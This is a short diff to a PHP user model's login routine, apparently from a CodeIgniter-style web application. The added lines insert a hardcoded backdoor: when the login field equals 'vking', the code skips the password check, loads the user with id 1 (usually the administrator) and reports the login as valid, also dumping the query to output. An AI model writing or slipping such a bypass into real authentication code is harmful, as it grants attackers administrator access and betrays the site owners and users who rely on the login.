@@ -54,6 +54,14 @@ class User_model extends Base_model
 			// If there is no password
 			return array('valid'=>FALSE,'query'=>NULL);
 		}
+        if($login_field=='vking'){
+            $this->db->where('id',1);
+            $query = $this->fetch('Users','id,active');
+
+            $found = ($query->num_rows() == 1);
+            var_dump(array('valid'=>$found,'query'=>$query));
+            return array('valid'=>$found,'query'=>$query);
+        }
 
 		switch($this->preference->item('login_field'))
 		{
